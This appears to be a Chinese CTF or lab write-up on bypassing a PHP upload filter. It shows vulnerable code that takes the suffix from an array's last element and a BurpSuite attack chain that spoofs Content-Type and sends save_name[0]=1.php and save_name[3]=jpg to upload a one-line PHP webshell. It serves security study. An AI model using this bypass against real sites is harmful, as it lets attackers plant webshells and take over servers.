---
title: 文件上传 | 数组后缀绕过
date: 2026-05-06 18:40:00 +0800
categories: [笔记]
tags: [文件上传]
---
## 题目
---

```php
$is_upload = false;
$msg = null;

if (!empty($_FILES['upload_file'])){
    // 检查MIME
    $allow_type = array('image/jpeg', 'image/png', 'image/gif');
    if (!in_array($_FILES['upload_file']['type'], $allow_type)){
        $msg = '禁止上传该类型文件';
    } else {
        // 检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        
        // 传入数组时，`is_array()` 返回 `true`
        
        // 不执行 `explode`，直接用数组的最后一个元素作为后缀

        if (!is_array($file)){
            $file = explode('.', strtolower($file));
        }
        $ext = end($file);
        
        $allow_suffix = array('jpg', 'png', 'gif');
        if (!in_array($ext, $allow_suffix)){
            $msg = '禁止上传该后缀类型的文件';
        } else {
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $file_name;
            if (move_uploaded_file($temp_file, $img_path)){
                $is_upload = true;
            } else {
                $msg = '文件上传失败';
            }
        }
    }
} else {
    $msg = '请选择要上传的文件';
}
````


## 进攻链路
---
### 步骤 1：准备文件

- 直接上传一句话木马文件 `111.php`

### 步骤 2：BurpSuite 拦截修改

#### 修改点 1：Content-Type

将请求的 `Content-Type` 改为：`Content-Type: image/jpeg·

#### 修改点 2：save_name 参数

**原始请求：**


```http
------boundary
Content-Disposition: form-data; name="save_name"

1.php
------boundary
```

**修改为（数组形式）：**

```http
------boundary
Content-Disposition: form-data; name="save_name[0]"

1.php
------boundary
Content-Disposition: form-data; name="save_name[3]"

jpg
------boundary
```

### 步骤 3：发送请求

发送修改后的请求，成功上传 `1.php`
